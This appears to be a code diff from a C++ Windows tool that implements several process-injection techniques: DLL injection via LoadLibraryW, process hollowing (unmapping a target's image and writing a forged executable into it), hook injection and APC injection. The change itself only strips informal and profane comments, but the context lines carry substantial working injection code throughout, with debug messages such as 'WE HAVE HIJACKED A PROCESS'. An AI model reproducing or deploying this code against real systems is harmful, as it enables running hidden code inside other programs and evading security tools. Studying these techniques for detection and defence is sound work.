@@ -76,7 +76,7 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 	/* Snapshot of processes */
 	DWORD processId{};
 	DbgPrint("[+] creating process snapshot");
-	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Fucking lazy auto bullshit, also snap all processes
+	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
 	if (hSnapshot == INVALID_HANDLE_VALUE)
 	{
 		DbgPrint("[!] failed to create process snapshot");
@@ -99,7 +99,7 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 	/* get first PID */
 	DbgPrint("[+] Starting process search");
 	BOOL isProcessFound = FALSE;
-	if (Process32First(hSnapshot, &pe) == FALSE)  //Get first "link" I guess
+	if (Process32First(hSnapshot, &pe) == FALSE)  
 	{
 		CloseHandle(hSnapshot);
 		DbgPrint("[!] unable to take first process snapshot");
@@ -193,7 +193,7 @@ BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
 	DbgPrint("[+] Got kernel32 handle");
 	DbgPrint("[+] Getting loadLibraryW handle");
 	auto LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryW");
-	if (LoadLibraryAddress == NULL) //Check if GetProcAddress works; if not try some ugly as sin correction code
+	if (LoadLibraryAddress == NULL)
 	{
 		DbgPrint("[-] Unable to find LoadLibraryW, What is this: Windows 2000?");
 		DbgPrint("[-] Trying LoadLibraryA");
@@ -261,7 +261,7 @@ tuple<bool, char*, streampos> OpenBinary(wstring filename)
 		ifile.seekg(0, ios::beg); 
 		ifile.read(bin, size);
 		ifile.close();
-		//Assuming we got this far it's okay to assume this worked!
+
 		flag = true;
 	}
 	return make_tuple(flag, bin, size); // return tuple of gathered data
@@ -362,7 +362,7 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 	DWORD dwReturnLength;	//used later in remote call
 	DbgPrint("===================================================\n\n");
 	// read remote PEB
-	PROCESS_BASIC_INFORMATION ProcessBasicInformation; //Because having 3 diffrent processinfo structures makes sense
+	PROCESS_BASIC_INFORMATION ProcessBasicInformation; 
 	
 	DbgPrint("============Hijacking Remote Functions==============");
 	// get NtQueryInformationProcess
@@ -384,7 +384,7 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 	}
 	DbgPrint("[+] got NtQueryInformationProcess\n");
 	DbgPrint("[ ] Executing NtQueryInformationProcess");
-	//Cast into useable function, thanks C++ template hacks! 
+
 	auto remoteNtQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(fpNtQueryInformationProcess);
 
 	//Call remote process NtQueryInformationProcess function
@@ -412,8 +412,6 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 	// remote image size calculation
 	auto BUFFER_SIZE = sizeof IMAGE_DOS_HEADER + sizeof IMAGE_NT_HEADERS64 + (sizeof IMAGE_SECTION_HEADER) * 100;
 
-	// Create new buffer to hold new process
-	//I will admit having a BYTE type in windows is pretty nice, I think it just resolves into an unsigned char tho...
 	auto remoteProcessBuffer = new BYTE[BUFFER_SIZE];
 
 	LPCVOID remoteImageAddressBase = pPEB->Reserved3[1]; // set forged process ImageBase to remote processes' image base
@@ -440,10 +438,10 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 	DbgPrint("[+] unmap'd remote process image\n");
 	// Allocating memory for our PE file
 	/* 
-	another complex call that we will now disect 
+
 	MSDN: https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa366890(v=vs.85).aspx
 	*/
-	// TODO: allocate this memory as read write and then remove the write flag and replace with exec flag
+
 	DbgPrint("[!] hijacking remote image");
 	DbgPrint("[ ] allocating memory in forign process");
 	auto hijackerRemoteImage = VirtualAllocEx(remoteProcessInfo->hProcess,		//hProcess			handle to the remote process
@@ -543,7 +541,7 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 	 //////AND THATS IT, WE HAVE HIJACKED A PROCESS!!!!//////
 	////////////////////////////////////////////////////////
 
-	CloseHandle(remoteProcessInfo->hProcess); //clean up when you are done, it's only polite.
+	CloseHandle(remoteProcessInfo->hProcess);
 	return TRUE;
 }
 
@@ -562,7 +560,7 @@ BOOL HookInjection(TCHAR target[], TCHAR *dll_name)
 
 	auto mp = MyProc(GetProcAddress(hdll, "MyProc"));
 	//auto mp = MyProc(GetProcAddress(hdll, "StartW"));
-	//If you know who uses StartW, hush, its a secret ;)
+
 
 	auto pStartupInfo = new STARTUPINFO();
 	auto pProcessInfo = new PROCESS_INFORMATION();
@@ -653,7 +651,6 @@ BOOL APCinjection(TCHAR target[], TCHAR *dll_name) {
 					"LoadLibraryW"), 
 				hThread, 
 				(ULONG_PTR)pVa);
-			// almost looks like a fuckin' nested SQL statment
 			CloseHandle(hThread);
 		}
 	}
